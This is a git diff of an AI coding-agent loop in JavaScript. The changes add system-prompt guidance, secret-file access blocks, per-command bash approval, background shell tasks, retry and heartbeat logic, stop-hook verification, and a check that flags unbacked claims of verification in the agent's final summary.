 # Don't work blind — ask when it matters
 Use ask_user before committing to a consequential guess: an ambiguous requirement with materially different implementations, a destructive/hard-to-reverse choice (deleting data, overwriting config, picking an irreversible approach), or missing information only the user has (which of several plausible targets, a credential/URL you don't have, a design preference with no existing convention to follow). Do NOT ask about anything discoverable by reading the code, grepping, or checking docs — do that instead. Do NOT ask about low-stakes details — just make a reasonable choice and mention it in your final summary. Keep it to at most one or two questions per task, and never combine ask_user with other tool calls in the same turn.
 
-# Delegate heavy exploration to sub-agents
-For a big or open-ended investigation — "how does X work across the codebase", "find everywhere Y is used", "research this library" — use spawn_agent to hand it to a read-only sub-agent with its own context. It returns just a findings report, keeping your context focused for the actual editing. Prefer it over reading a dozen files yourself when you only need the conclusions. Spawn several for independent questions. Don't use it for small lookups you can do in one or two grep/read calls, and remember sub-agents can't edit — you make the changes based on what they report.
+# Reading multiple files: batch vs delegate
+Two different tools for two different situations — pick by whether you already know WHICH files matter:
+- You already know the small set of files you need (e.g. "read these 4 related components before editing them"): call read_file for each of them as separate tool calls in the SAME turn — they run in parallel, so this costs nothing extra and is the default for known, bounded work.
+- You do NOT yet know which files matter — an open-ended investigation ("how does auth work across this codebase", "find everywhere X is used", "research this library"), or answering it would mean reading roughly 6+ files just to find the relevant ones: use spawn_agent instead. It runs a read-only sub-agent in its OWN context window and returns only a findings report, so your own context doesn't fill up with every file it had to check. Spawn several for independent questions. Sub-agents can't edit — you make the actual changes yourself based on what they report.
+Don't use spawn_agent for a lookup you can already scope to a handful of known files — batch those directly instead.
 
 # Web search — don't answer stale facts from memory
 You have web_search(query) and fetch_url(url). ALWAYS web_search first — never answer from memory — when the question is about anything time-sensitive or that changes over time, even if you think you already know: the "latest/newest/current/last/recent" version, release, price, score, WINNER, standings, ranking, or news; anything with "today/now/this year/as of"; who currently holds a role or title; or any fact tied to a date near or after your training cutoff. Your training data is stale, so a confident answer is often WRONG. Flow: web_search to find sources, then fetch_url the best result to read the real page (snippets can be stale). If the user gives a URL, fetch_url it. Do NOT search for the user's own codebase or stable general knowledge.
@@ -1047,12 +1823,21 @@ ${snapshot}
 // ── Tool executor ─────────────────────────────────────────────────────────────
 
 export async function executeTool(name, args, ctx) {
-  const { root, emit, sessionId, requestId, hooks, editedFiles, todosRef, permissionMode, askUser, creds, isSubAgent, workspaceSnapshot, abortSignal } = ctx;
+  const { root, emit, sessionId, requestId, hooks, permissions, editedFiles, todosRef, permissionMode, askUser, creds, isSubAgent, workspaceSnapshot, abortSignal } = ctx;
+  if (args && typeof args === "object" && args.__kodo_parse_error__) {
+    return {
+      success: false,
+      error: `${args.__kodo_parse_error__} This means the file content itself is fine — it just doesn't fit in one turn. Split the work into smaller calls: write a shorter version first with write_file then extend it with edit_file, or produce a large new file as several smaller edit_file additions after an initial small write_file. Do NOT switch to writing file content via bash (heredoc/cat/echo/node -e) — that isn't a workaround for this, it's a different tool with a much smaller size limit (2000 chars) that will fail faster and worse.`,
+    };
+  }
   try {
     switch (name) {
       case "read_file": {
         const relPath = String(args.path || "").trim();
         if (!relPath) return { success: false, error: "path is required" };
+        if (isSensitiveFilePath(relPath)) {
+          return { success: false, error: `Reading ${relPath} is blocked — it holds secrets/credentials. The agent is not allowed to load secret files into context.` };
+        }
         const absPath = safeResolve(root, relPath);
         const content = await readFileSafe(absPath);
         if (content === null) return { success: false, error: `File not found: ${relPath}` };
@@ -1087,6 +1872,7 @@ export async function executeTool(name, args, ctx) {
         const newString = String(args.new_string ?? "");
         if (!relPath || !oldString) return { success: false, error: "path and old_string are required" };
         if (oldString === newString) return { success: false, error: "old_string and new_string are identical" };
+        if (isSensitiveFilePath(relPath)) return { success: false, error: `Editing ${relPath} is blocked — the agent may not modify secret/credential files.` };
         const absPath = safeResolve(root, relPath);
         const original = await readFileSafe(absPath);
         if (original === null) return { success: false, error: `File not found: ${relPath}. Use write_file to create new files.` };
@@ -1132,6 +1918,7 @@ export async function executeTool(name, args, ctx) {
         const content = String(args.content ?? "");
         if (!relPath) return { success: false, error: "path is required" };
         if (!content.trim()) return { success: false, error: "content is empty — to create an empty file use bash `touch`" };
+        if (isSensitiveFilePath(relPath)) return { success: false, error: `Writing ${relPath} is blocked — the agent may not create or overwrite secret/credential files.` };
         const absPath = safeResolve(root, relPath);
         const existing = await readFileSafe(absPath);
         if (existing !== null && !ctx.readFiles.has(relPath)) {
@@ -1164,16 +1951,77 @@ export async function executeTool(name, args, ctx) {
       }
 
       case "bash": {
+        // Hard kill switch for locked-down / untrusted testing: set
+        // KODO_DISABLE_BASH=1 to remove shell execution entirely. The agent can
+        // still read/edit files, grep, glob and search the web.
+        if (process.env.KODO_DISABLE_BASH === "1") {
+          return { success: false, error: "The bash tool is disabled on this server (KODO_DISABLE_BASH=1). Accomplish the task with read_file/edit_file/write_file/grep instead." };
+        }
         const command = String(args.command || "").trim();
-        const invalid = validateBashCommand(command);
+        const invalid = validateBashCommand(command, permissions);
         if (invalid) return { success: false, error: invalid };
         if (permissionMode === "plan" && !BASH_READONLY_RE.test(command)) {
           return { success: false, error: "Plan mode — only read-only commands are allowed." };
         }
+
+        // Claude Code-style per-command approval: a workspace "ask" rule
+        // pauses for THIS specific command regardless of permissionMode —
+        // independent of (and in addition to) the coarser "ask" permission
+        // mode's one-time first-mutation gate elsewhere in the loop.
+        if (bashApprovalNeeded(command, permissions)) {
+          if (!askUser) {
+            return { success: false, error: `This command requires approval under this workspace's permission rules (.kodo/settings.json "ask") but asking isn't available in this context: "${command.slice(0, 100)}"` };
+          }
+          emit?.({ type: "progress", stage: "planning", message: `❓ approval needed: ${command.slice(0, 100)}` });
+          let answer;
+          try {
+            answer = await askUser({
+              question: `This workspace requires approval before running:\n\n${command}`,
+              header: "Run command?",
+              options: [
+                { label: "Allow", description: "Run this command" },
+                { label: "Deny", description: "Do not run it" },
+              ],
+            });
+          } catch (err) {
+            return { success: false, error: `Approval cancelled: ${String(err?.message || err)}` };
+          }
+          if (!/^allow\b/i.test(String(answer || "").trim())) {
+            return { success: false, error: `Command not approved by the user (answered: "${String(answer || "").slice(0, 80)}").` };
+          }
+        }
+
+        ctx.bashCommands?.push(command);
+
+        if (args.run_in_background) {
+          const { id, outputFile } = await runBashBackground(command, root, root);
+          emit?.({ type: "progress", stage: "executing", message: `$ ${command.slice(0, 100)} (background: ${id})` });
+          return {
+            success: true,
+            background: true,
+            task_id: id,
+            output_file: outputFile,
+            message: `Started in the background as task "${id}". Use bash_output with this task_id to check it actually came up before telling the user it's running. Use kill_shell to stop it.`,
+          };
+        }
+
         const timeout = Math.min(Number(args.timeout_ms) || 120_000, 300_000);
         emit?.({ type: "progress", stage: "executing", message: `$ ${command.slice(0, 100)}` });
         const res = await runBash(command, root, timeout);
         return { success: res.exit_code === 0, ...res };
+      }
+
+      case "bash_output": {
+        const taskId = String(args.task_id || "").trim();
+        if (!taskId) return { success: false, error: "task_id is required" };
+        return await readBackgroundTaskOutput(taskId);
+      }
+
+      case "kill_shell": {
+        const taskId = String(args.task_id || "").trim();
+        if (!taskId) return { success: false, error: "task_id is required" };
+        emit?.({ type: "progress", stage: "executing", message: `⏹ stopping background task ${taskId}` });
+        return killBackgroundTask(taskId);
       }
 
       case "grep": {
@@ -1252,6 +2100,11 @@ export async function executeTool(name, args, ctx) {
         return await fetchUrl(args.url);
       }
 
+      case "verify_ui": {
+        emit?.({ type: "progress", stage: "executing", message: `🖥️ verify_ui: ${String(args.url || "").slice(0, 80)}...` });
+        return await verifyUi(args, ctx);
+      }
+
       case "spawn_agent": {
         if (isSubAgent) {
           return { success: false, error: "Sub-agents cannot spawn further sub-agents. Do the investigation directly." };
@@ -1265,6 +2118,7 @@ export async function executeTool(name, args, ctx) {
           task,
           workspaceSnapshot,
           hooks,
+          permissions,
           emit,
           abortSignal,
         });
@@ -1311,6 +2165,20 @@ export async function resolveCreds(modelRoute) {
     baseURL: process.env.OPENAI_BASE_URL || "https://api.openai.com/v1",
     model: process.env.DEFAULT_MODEL || "gpt-4o-mini",
   };
+}
+
+// Deliberately NOT a fallback chain like resolveCreds above: vision
+// escalation must stay OFF unless the user genuinely configured a
+// vision-capable model (routeModel(settings, {hasImageAttachments:true})
+// from services/modelRouter.mjs already validated capability via
+// config/models.mjs's hasVision()). Falling back to the text model's creds
+// or an env var here would silently "succeed" at a vision call against a
+// model that was never confirmed to support images.
+export function resolveVisionCreds(visionRoute) {
+  if (visionRoute?.ok && visionRoute?.apiKey && visionRoute?.model) {
+    return { apiKey: visionRoute.apiKey, baseURL: visionRoute.baseUrl || "https://api.openai.com/v1", model: visionRoute.model, provider: visionRoute.provider };
+  }
+  return null;
 }
 
 // Multi-step requests (numbered lists, several imperative verbs joined by
@@ -1381,12 +2249,13 @@ export const WEB_SEARCH_DIRECTIVE = webSearchDirective();
 
 export async function agentLoopNode(state) {
   const {
-    workspacePath, userMessage, modelRoute, emit,
+    workspacePath, userMessage, modelRoute, visionRoute, emit,
     rememberedTargetFile = "", sessionId, requestId,
     permissionMode = "auto", approvalPromise = null, abortSignal = null,
     askUser = null,
   } = state;
 
+  const runStartedAt = Date.now();
   const root = workspacePath || PROJECT_ROOT;
   const cleanMessage = String(userMessage).split(/conversation memory:/i)[0].trim();
   const memoryTail = String(userMessage).slice(cleanMessage.length).trim();
@@ -1394,19 +2263,21 @@ export async function agentLoopNode(state) {
   emit?.({ type: "progress", stage: "exploring", message: permissionMode === "plan" ? "📐 Plan mode — exploring..." : "🤖 Agent working..." });
 
   const creds = await resolveCreds(modelRoute);
+  const visionCreds = resolveVisionCreds(visionRoute);
   if (!creds.apiKey) {
     const msg = "No API key configured. Open Settings and add a model + API key.";
     emit?.({ type: "content", content: msg });
     return { finalAnswer: msg, editedFiles: [], messages: [new AIMessage(msg)] };
   }
 
-  const [workspaceSnapshot, memoryIndex, skillIndex, hooks, kodoMd] = await Promise.all([
+  const [workspaceSnapshot, memoryIndex, skillIndex, kodoSettings, kodoMd] = await Promise.all([
     walkWorkspace(root, 8),
     loadMemoryIndex(root),
     loadSkillIndex(root),
-    loadHooks(root),
+    loadKodoSettings(root),
     readFileSafe(path.join(root, "KODO.md"), 24_000),
   ]);
+  const { hooks, permissions, mcpServers } = kodoSettings;
 
   const systemPrompt = buildSystemPrompt({
     workspaceTree: workspaceSnapshot,
@@ -1421,19 +2292,23 @@ export async function agentLoopNode(state) {
   const seedBlocks = [];
   const msgLower = cleanMessage.toLowerCase();
   const ctx = {
-    root, emit, sessionId, requestId, hooks,
+    root, emit, sessionId, requestId, hooks, permissions, mcpServers,
     editedFiles: new Map(),
     readFiles: new Set(),
+    bashCommands: [], // every bash command actually run this turn — backs the anti-fabrication check below
     todosRef: { current: [] },
     workspaceSnapshot,
     permissionMode,
     askUser,
     creds,          // lets the spawn_agent tool run a nested sub-agent loop
+    visionCreds,    // resolved below; lets verify_ui escalate a failure to a vision model
     isSubAgent: false,
     abortSignal,
+    mcpClients: new Map(), // lazily populated by verify_ui; closed at the end of this run
   };
   for (const f of workspaceSnapshot) {
     if (f.isDir || seedBlocks.length >= 3) continue;
+    if (isSensitiveFilePath(f.path)) continue; // never auto-preload a secret file
     if (msgLower.includes(f.path.toLowerCase())) {
       const content = await readFileSafe(safeResolve(root, f.path));
       if (content && content.length < 60_000) {
@@ -1469,15 +2344,26 @@ export async function agentLoopNode(state) {
 
   const conversation = [{ role: "user", content: firstUserMsg }];
   const usage = { inputTokens: 0, outputTokens: 0, llmCalls: 0 };
+  // write_file/edit_file are hard-rejected at the executor in plan mode
+  // (see the "case edit_file"/"case write_file" guards below) — their only
+  // possible outcome there is an error telling the model to stop, so their
+  // schemas are pure wasted tokens on every iteration of a plan-mode run.
+  // Everything else (bash, read tools, verify_ui, etc.) still behaves
+  // normally in plan mode, so stays in the list.
+  const PLAN_MODE_BLOCKED_TOOLS = new Set(["write_file", "edit_file"]);
+  const toolsForThisRun = permissionMode === "plan"
+    ? AGENT_TOOLS.filter((t) => !PLAN_MODE_BLOCKED_TOOLS.has(t.function.name))
+    : AGENT_TOOLS;
 
   // One tool-calling turn loop, reused for both the main pass and the bounded
   // post-verification fix-up pass — same LLM-call/tool-execution/context-trim
   // logic, parameterized only by iteration budget and whether the ask-mode
   // approval gate is still active (it's already past by the time a fix-up runs).
-  async function runToolLoop({ iterationBudget, approvalState }) {
+  async function runToolLoop({ iterationBudget, approvalState, nudgeOnStall = false }) {
     let iteration = 0;
     let consecutiveErrors = 0;
     let enforcedApply = false;   // only force "apply the code" once per loop
+    let stallNudged = false;     // only nudge once per loop
     let finalAnswer = "";
     const onChunk = (chunk) => emit?.({ type: "content", content: chunk });
 
@@ -1486,25 +2372,69 @@ export async function agentLoopNode(state) {
       iteration++;
 
       let message, callUsage;
+      // Streaming only produces visible chunks for narrative TEXT — a turn
+      // that's purely generating a large tool call (e.g. a big write_file)
+      // emits nothing via onChunk while it's happening, even though the
+      // provider is actively working. Combined with a "thinking"-model
+      // client timeout as long as 10 minutes (see agentChat.mjs), that turn
+      // looks completely indistinguishable from hung: no new step, no
+      // content, for minutes at a time. This heartbeat doesn't detect real
+      // hangs (it can't — it doesn't know what the provider is doing), it
+      // just makes legitimate slow generation visibly ALIVE instead of
+      // silent, so "still working" and "actually stuck" stop looking
+      // identical from the outside.
+      const heartbeatStartedAt = Date.now();
+      const heartbeat = setInterval(() => {
+        const elapsed = Math.round((Date.now() - heartbeatStartedAt) / 1000);
+        emit?.({ type: "progress", stage: "thinking", message: `⏳ still working on this step... (${elapsed}s)` });
+      }, 12_000);
       try {
         ({ message, usage: callUsage } = await chatWithTools({
           creds,
           system: systemPrompt,
           messages: conversation,
-          tools: AGENT_TOOLS,
-          maxTokens: 8_000,
+          tools: toolsForThisRun,
+          // A real component file (or several batched into one turn) can
+          // easily need more than 8k output tokens once JSON-escaped —
+          // hitting the cap mid-generation truncates the tool call's
+          // arguments, which used to be the actual root cause behind the
+          // model abandoning write_file for bash heredoc workarounds on
+          // large multi-file builds. Not unlimited — still bounded, still
+          // caught (and now clearly explained) by the parse-error sentinel
+          // in normalizeArgumentsJSON if a provider's real ceiling is lower.
+          maxTokens: 16_000,
           temperature: 0,
           signal: abortSignal || undefined,
           onChunk,
+          // The main tool-calling loop is mechanical decision-making (which
+          // tool, which args) repeated up to MAX_ITERATIONS times per run —
+          // not the kind of open-ended reasoning "thinking mode" is for.
+          // Explicit, not a name guess: see the note in agentChat.mjs — some
+          // providers default this on server-side regardless of model name.
+          thinking: false,
         }));
         usage.inputTokens += callUsage?.inputTokens || 0;
         usage.outputTokens += callUsage?.outputTokens || 0;
         usage.llmCalls++;
+        // Duration is the whole reason the heartbeat above exists: reconstructing
+        // this after the fact from unrelated log lines (frontend polling, etc.)
+        // is exactly the manual timestamp archaeology that made a real production
+        // log painful to diagnose. Log it directly instead.
+        console.log(`[AgentLoop] ${iteration}/${iterationBudget} LLM call took ${Date.now() - heartbeatStartedAt}ms (${callUsage?.inputTokens || 0}in/${callUsage?.outputTokens || 0}out tokens, ${message.tool_calls?.length || 0} tool call(s))`);
       } catch (err) {
         if (abortSignal?.aborted) { finalAnswer = "Operation cancelled."; break; }
         const errStr = String(err?.message || err);
-        console.warn(`[AgentLoop] LLM error (iter ${iteration}):`, errStr.slice(0, 200));
-        const isTransient = /\b(504|503|502|529|429)\b|timeout|timed out|ETIMEDOUT|ECONNRESET|overloaded/i.test(errStr);
+        console.warn(`[AgentLoop] LLM error (iter ${iteration}, after ${Date.now() - heartbeatStartedAt}ms):`, errStr.slice(0, 200));
+        // Includes stream/connection-abort signatures ("BodyStreamBuffer was
+        // aborted", "premature close", "socket hang up") — these are the
+        // underlying HTTP client tearing down a connection mid-read (e.g. a
+        // slow "thinking" model going quiet long enough to trip a transport
+        // timeout — see the undici dispatcher in agentChat.mjs, which raises
+        // that ceiling but doesn't guarantee it never happens), not a
+        // permanent failure. They used to fall straight through to "provider
+        // failed, try again" on the first occurrence instead of getting the
+        // same retry-with-backoff treatment as every other transient error.
+        const isTransient = /\b(504|503|502|529|429)\b|timeout|timed out|ETIMEDOUT|ECONNRESET|ECONNABORTED|overloaded|aborted|premature close|socket hang ?up|network ?error|fetch failed/i.test(errStr);
         // A 400 / "Extra data" / context-length error usually means the request
         // got too big (many fetches). Aggressively shrink old tool outputs and
         // retry once — the same request would just fail again otherwise.
@@ -1537,6 +2467,11 @@ export async function agentLoopNode(state) {
         }
         finalAnswer = `The AI provider failed after ${consecutiveErrors} attempt(s): ${errStr.slice(0, 200)}. Please try again.`;
         break;
+      } finally {
+        // Runs on every exit path out of the try/catch above (including the
+        // `continue`/`break` retry branches) — the heartbeat must stop the
+        // moment the call actually resolves, one way or another.
+        clearInterval(heartbeat);
       }
       consecutiveErrors = 0;
 
@@ -1616,22 +2551,12 @@ export async function agentLoopNode(state) {
         ? message.tool_calls.filter((tc) => tc !== askUserCall)
         : [];
 
-      const toolResults = [];
-      for (const toolCall of toolCallsThisTurn) {
-        if (abortSignal?.aborted) break;
-        const toolName = toolCall.function.name;
-        let args = {};
-        try { args = JSON.parse(toolCall.function.arguments || "{}"); } catch {}
-        console.log(`[AgentLoop] ${iteration}/${iterationBudget} → ${toolName}(${JSON.stringify(args).slice(0, 140)})`);
-
-        const result = await executeTool(toolName, args, ctx);
-
-        const raw = JSON.stringify(result);
-        const capped = raw.length > MAX_TOOL_OUTPUT_CHARS
-          ? raw.slice(0, MAX_TOOL_OUTPUT_CHARS) + '..."[truncated]"}'
-          : raw;
-        toolResults.push({ role: "tool", tool_call_id: toolCall.id, content: capped });
-      }
+      // Side-effect-free calls the model batched into this turn (e.g. reading
+      // several related files before editing them) run CONCURRENTLY — the
+      // same "independent tool calls run in parallel" principle Claude Code
+      // itself follows. Mutating calls run strictly sequentially and in
+      // order. See executeToolCallsBatch for the full contract.
+      const toolResults = await executeToolCallsBatch(toolCallsThisTurn, ctx, iteration, iterationBudget, abortSignal);
       for (const deferred of deferredCalls) {
         toolResults.push({
           role: "tool",
@@ -1640,6 +2565,22 @@ export async function agentLoopNode(state) {
         });
       }
       conversation.push(...toolResults);
+
+      // Self-pacing nudge: a build/change request that has burned most of its
+      // budget on research (grep/read/web_search/fetch_url) without editing a
+      // single file usually means the model is over-researching instead of
+      // using the tools built for exactly this — spawn_agent to offload heavy
+      // exploration, or ask_user to stop guessing — and is heading for an
+      // "iteration budget reached, nothing was built" dead end. One reminder,
+      // fired once, pointed at its own escape hatches.
+      if (nudgeOnStall && !stallNudged && ctx.editedFiles.size === 0
+          && iteration >= Math.floor(iterationBudget * 0.6) && looksBuildRequest(cleanMessage)) {
+        stallNudged = true;
+        conversation.push({
+          role: "user",
+          content: `[${iteration}/${iterationBudget} steps used, no files changed yet.] If you're still gathering context, stop researching directly and either: delegate remaining open-ended exploration to spawn_agent so it doesn't cost you more turns, or call ask_user if something is genuinely ambiguous. Otherwise you likely already have enough to start editing — make the actual changes now instead of continuing to look things up.`,
+        });
+      }
 
       // Size guard: several fetches/reads can blow past the model's input limit.
       // Shrink old tool outputs to keep the whole conversation under budget.
@@ -1669,11 +2610,12 @@ export async function agentLoopNode(state) {
   }
 
   const approvalState = { granted: permissionMode !== "ask", promise: approvalPromise };
-  const mainResult = await runToolLoop({ iterationBudget: MAX_ITERATIONS, approvalState });
+  const mainResult = await runToolLoop({ iterationBudget: MAX_ITERATIONS, approvalState, nudgeOnStall: true });
   let finalAnswer = mainResult.finalAnswer;
 
   if (mainResult.cancelled) {
     emit?.({ type: "content", content: finalAnswer });
+    closeMcpClients(ctx);
     return { finalAnswer, editedFiles: [], usage, messages: [new AIMessage(finalAnswer)] };
   }
 
@@ -1690,6 +2632,7 @@ export async function agentLoopNode(state) {
         temperature: 0,
         signal: abortSignal || undefined,
         onChunk: (chunk) => { streamedAny = true; emit?.({ type: "content", content: chunk }); },
+        thinking: false,
       });
       finalAnswer = String(message.content || "").trim();
     } catch { /* fall through to the static message below */ }
@@ -1699,40 +2642,65 @@ export async function agentLoopNode(state) {
     }
   }
 
-  // Enforced verification: run the project's real typecheck/lint regardless of
-  // whether the model chose to, then loop the fix-up until it actually passes
-  // (bounded). A single fix-up pass often isn't enough for subtler failures
-  // (a type error, a duplicate declaration, a bad framer-motion Variants), so
-  // a weaker model would otherwise ship code that doesn't build. Retrying — and
-  // re-feeding the *current* remaining errors each round — is what stops those
-  // build breaks from reaching the user.
+  // Stop-hook verification (Claude Code-style): if THIS project declared a
+  // `stop` command in .kodo/settings.json, run it and block completion until it
+  // passes (bounded retries — see runStopHook above for why this doesn't try
+  // to guess the toolchain itself). A single fix-up pass often isn't enough
+  // for subtler failures, so retrying with the *current* remaining output fed
+  // back each round is what stops real build breaks from reaching the user.
+  // No hook configured → nothing runs here and no claim is made; verification
+  // is whatever the model itself already did per the VERIFY step.
   const MAX_FIX_ATTEMPTS = 3;
+  let stopHookPassed = false;
   if (!abortSignal?.aborted && ctx.editedFiles.size > 0) {
-    let failureReport = await autoVerifyFrontendEdits(root, [...ctx.editedFiles.keys()], emit);
+    let result = await runStopHook(root, hooks, emit);
     let attempt = 0;
 
-    while (failureReport && attempt < MAX_FIX_ATTEMPTS && !abortSignal?.aborted) {
+    while (result.ran && !result.passed && attempt < MAX_FIX_ATTEMPTS && !abortSignal?.aborted) {
       attempt++;
       emit?.({ type: "progress", stage: "executing", message: `⚠️ Verification failed — fixing (attempt ${attempt}/${MAX_FIX_ATTEMPTS})...` });
       conversation.push({
         role: "user",
-        content: `Automated verification (typecheck/lint) is FAILING because of your changes — the code does not build. Fix EVERY error listed below. Read the offending files if needed, make the edits, and do NOT claim you're done until these pass. When genuinely fixed, reply with a short summary.\n\n${failureReport.slice(0, 6000)}`,
+        content: `The configured verify command (\`${hooks.stop}\`) is FAILING because of your changes. Fix EVERY issue below. Read the offending files if needed, make the edits, and do NOT claim you're done until it genuinely passes. When fixed, reply with a short summary.\n\n${result.output.slice(0, 6000)}`,
       });
       await runToolLoop({ iterationBudget: 8, approvalState: null });
       // The fix pass streamed its own narration live; re-check the real state.
-      failureReport = await autoVerifyFrontendEdits(root, [...ctx.editedFiles.keys()], null);
+      result = await runStopHook(root, hooks, null);
     }
 
-    const note = failureReport
-      ? `\n\n⚠️ **This change does not build** — automated typecheck/lint is still failing after ${attempt} fix attempt(s). Review before using; the remaining errors are:\n${failureReport.slice(0, 800)}`
-      : `\n\n✅ Verified: typecheck and lint pass.`;
+    const note = !result.ran
+      ? ""
+      : result.passed
+        ? `\n\n✅ Verified — \`${hooks.stop}\` passed.`
+        : `\n\n⚠️ **Verification is still failing** after ${attempt} fix attempt(s) (\`${hooks.stop}\`). Review before using:\n${result.output.slice(0, 800)}`;
     finalAnswer += note;
-    emit?.({ type: "content", content: note });
+    if (note) emit?.({ type: "content", content: note });
+    stopHookPassed = result.ran && result.passed;
+  }
+
+  // Anti-fabrication backstop: the stop-hook note above is the only
+  // CODE-appended "verified" claim, and it's already gated on a real passing
+  // command. But the model's own FINISH-step prose can still assert
+  // "verified" / "tests pass" as habitual boilerplate even when it never ran
+  // a check this turn — that's the false-confidence pattern users actually
+  // hit. Catch it here: if the free text claims verification but nothing
+  // real backs it (no passing stop hook, no test/lint/build/curl-shaped bash
+  // command actually run this turn), correct it rather than let it stand.
+  if (hasUnhedgedVerificationClaim(finalAnswer) && !stopHookPassed) {
+    const ranRealCheck = ctx.bashCommands.some((cmd) => VERIFY_COMMAND_RE.test(cmd));
+    if (!ranRealCheck) {
+      const correction = "\n\n⚠️ Correction: the summary above claims verification, but no test/lint/build/typecheck command was actually run this turn — treat it as unverified.";
+      finalAnswer += correction;
+      emit?.({ type: "content", content: correction });
+    }
   }
 
   const editedFiles = [...ctx.editedFiles.keys()];
   emit?.({ type: "usage", ...usage, model: creds.model });
-  console.log(`[AgentLoop] Done: ${editedFiles.length} file(s) edited, ${usage.inputTokens}+${usage.outputTokens} tokens, ${usage.llmCalls} LLM call(s)`);
+  const totalMs = Date.now() - runStartedAt;
+  const avgMsPerCall = usage.llmCalls > 0 ? Math.round(totalMs / usage.llmCalls) : 0;
+  console.log(`[AgentLoop] Done: ${editedFiles.length} file(s) edited, ${usage.inputTokens}+${usage.outputTokens} tokens, ${usage.llmCalls} LLM call(s), ${totalMs}ms total (~${avgMsPerCall}ms/call avg), model=${creds.model}`);
+  closeMcpClients(ctx);
 
   return {
     finalAnswer,
